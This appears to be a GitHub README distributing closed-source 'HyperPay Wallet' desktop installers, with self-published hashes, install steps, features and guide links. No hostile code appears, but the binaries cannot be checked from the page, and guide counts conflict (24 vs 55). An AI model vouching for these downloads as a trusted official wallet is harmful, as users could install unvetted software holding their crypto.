<p align="center"><img src="assets/banner-app.png" alt="HyperPay - crypto wallet, card and custody"></p>

<h1 align="center">HyperPay Wallet</h1>

<p align="center">Desktop wallet for Windows, macOS and Linux: custodial and self-custody balances in one account, built on the HyperPay application.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

Every file above is attached to the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21). Compare the file you downloaded against the hash below before you run it, and stop if the two differ.

<!-- SHA256:BEGIN -->
| Installer | SHA-256 |
| --- | --- |
| hyperpay-wallet-windows-v5.6.21.exe | 929ed384b4946a791500da702b656885a7e05b68aa94b8bf85cf9f21443200c1 |
| hyperpay-wallet-macos-v5.6.21.dmg | 4fd9ef8451e33c1716513cc5569fe3b43d7ec1b7163986faa458351613fa52ab |
| hyperpay-wallet-linux-v5.6.21.zip | dda50fe7f43a9eaecb37a99662b938fa06b8e1ad0ed82cee9a59f0cedf555f75 |
<!-- SHA256:END -->

> Only download from this GitHub release page.

---

## Install

<details open>
<summary><img src="assets/platform-windows.png" alt="Windows"></summary>

1. Download `hyperpay-wallet-windows-v5.6.21.exe` and confirm its SHA-256 against the table above.
2. Run the installer and let it finish; the default folder is fine for most readers.
3. Launch HyperPay Wallet from the Start menu, then create a new wallet or restore one from a phrase.
4. Write the recovery phrase down on paper before you move any funds into the wallet.

</details>

<details>
<summary><img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"></summary>

1. Download `hyperpay-wallet-macos-v5.6.21.dmg` and confirm its SHA-256 against the table above.
2. Open the disk image and drag HyperPay Wallet into Applications.
3. Launch it from Applications; if macOS blocks the first launch, allow it in System Settings, Privacy and Security.
4. Create a wallet or restore one, then store the recovery phrase away from the machine.

</details>

<details>
<summary><img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"></summary>

1. Download `hyperpay-wallet-linux-v5.6.21.zip` and confirm its SHA-256 against the table above.
2. Unpack the archive into a folder you own, for example under your home directory.
3. Mark the binary executable if the unpacked file has lost its permission bit.
4. Start the wallet, create or restore an account, and back up the phrase before funding it.

</details>

## Features

- One account with two storage modes: custodial balances managed through HyperBC custody, and self-custody keys generated and held on your device.
- Self-custody keys follow BIP32, BIP39, BIP44 and BIP45, so a recovery phrase restores in any wallet that implements the same standards.
- Chains published as examples: Bitcoin, Ethereum, BNB Chain, Tron, Solana, XRP Ledger, Litecoin and Polygon, plus tokens on those networks.
- HyperCard, a prepaid card funded with crypto and converted into a spendable USD or EUR balance, without a bank account or credit check.
- Hardware signing through HyperMate over Bluetooth, and through Sealer2100, the limited-edition device that signs offline over QR codes.
- In-app exchange, staking on supported proof-of-stake assets, and over-collateralized loans against held balances.
- Desktop builds for Windows, macOS and Linux from one release page, with a checksum published for each installer.

---

## What this repository is for

This repository is the distribution point for the HyperPay Wallet desktop application, and its README is the page a reader lands on when they already know they want the wallet. It carries the three installers, the checksum table, the install steps for each platform and a short feature list, then hands the reader to the written guides. What lives here is the build and its release notes; what does not live here is the application's source, which is closed, and any description of how the code is put together.

## Who it is for

- You have decided to install the wallet and want the correct file, the hash and the install order.
- You are reinstalling on a second machine and need to know which step protects the balance.
- You support someone else and want one page that shows every platform without a detour.
- You are checking whether a build you already have is the current one.

## Start here

<div align="center">

| Guide | What it settles |
| --- | --- |
| [Download and install on Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md) | Covers the installer, the first launch and the checks that show the download is the genuine file. |
| [Back up the recovery phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/back-up-a-hyperpay-recovery-phrase.md) | Sets out the two-copy rule and explains why a photo of the phrase weakens the wallet. |
| [Update to the current build](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/update-hyperpay-to-the-latest-build.md) | Shows why most connection and display faults disappear with the newest build and how to move to it. |
| [Restore from a phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/restore-a-hyperpay-wallet-from-phrase.md) | Walks through a restore on a new device and what to check before the wallet holds funds again. |

</div>

## How to use these guides

1. Install the build first, using the steps above, and confirm the hash before you run anything.
2. Create or restore the wallet, then write the recovery phrase down before a single deposit arrives.
3. Read the backup guide and put the second copy somewhere that is not the machine you installed on.
4. Move a small test amount before you move a balance, and confirm it arrives on the network you chose.
5. When something breaks, read the repair guide for that symptom before you reinstall anything.
6. Use the name and trust guides when a download, an app or a message looks wrong rather than close.

## The guides, grouped

<div align="center">

| Group | Guides |
| --- | --- |
| Install and update | [Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md), [macOS](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/install-hyperpay-wallet-on-macos.md), [Linux](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/run-hyperpay-wallet-on-linux.md), [update](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/update-hyperpay-to-the-latest-build.md) |
| Custody and keys | [What the wallet is](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/what-is-a-hyperpay-wallet.md), [custodial vs self-custody](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/custodial-vs-self-custody-in-hyperpay.md), [switch to self-custody](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/switch-hyperpay-wallet-to-self-custody.md) |
| Recovery | [Back up a phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/back-up-a-hyperpay-recovery-phrase.md), [restore](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/restore-a-hyperpay-wallet-from-phrase.md), [lost phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/lost-hyperpay-recovery-phrase-options.md) |
| Transfers | [Send](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/send-crypto-from-hyperpay-wallet.md), [receive](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/receive-crypto-into-a-hyperpay-wallet.md), [fees](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-fees-explained.md) |
| Repairs | [Zero balance](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-shows-zero-balance.md), [stuck on syncing](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-stuck-on-syncing.md), [login](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/fix-hyperpay-wallet-login-problems.md) |

</div>

All 24 wallet guides are indexed in [hyperpay-wallet-guide](https://github.com/hyperpay-gateway/hyperpay-wallet-guide).

## What each guide changes

<div align="center">

| Task | Guide | What is different afterwards |
| --- | --- | --- |
| Get the app installed | Download for Windows | The installer has run and the wallet opens with a verified build. |
| Keep the wallet recoverable | Back up the recovery phrase | Two copies exist away from the machine, so a lost laptop is an inconvenience. |
| Move an existing wallet | Restore from a phrase | The same keys are back on the new device, with the balance confirmed. |
| Fix a display or sync fault | Update to the current build | The newest build is running, which removes the most common connection faults. |
| Understand the custody choice | Custodial vs self-custody | You know which mode holds which balance and where the recovery duty sits. |

</div>

## Common first questions

### Is this the whole HyperPay application?

This repository holds the desktop builds and their release notes; the application itself is closed source. The release page is the only place these installers are published.

### Which file do I run on Linux?

The Linux build is a zip archive rather than a single executable. Unpack it, keep the folder, and start the binary inside it.

### Does the wallet work without an account?

There is no separate exchange account. A wallet is created inside the application, and custodial mode adds an account-level recovery route that self-custody mode does not have.

---

## Before you install

Confirm the hash of the file you downloaded, and treat a build from anywhere else as unverified. HyperPay support never asks for a recovery phrase, a private key or a screen share of an unlocked wallet, and any message that does is an attack.

## About

HyperPay Wallet is published by CipherBC Hyperpay Pte. Ltd. and has operated since 2017. The application is closed source and rests on audits by SlowMist and CertiK for the core app, with custodial balances held through HyperBC. The desktop build is one of several surfaces: the card, the hardware devices and the mobile build are separate products, and this page covers only the desktop wallet.

## License

No licence is stated for this README or the repositories' written content. The company states that Sealer2100 firmware is published under Apache 2.0; the firmware repository carries no licence file, and the core application is closed source.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">All 55 guides</a> -
  <a href="https://github.com/hyperpay-gateway/hypercard-guide">HyperCard</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-name-and-trust">Name and trust</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
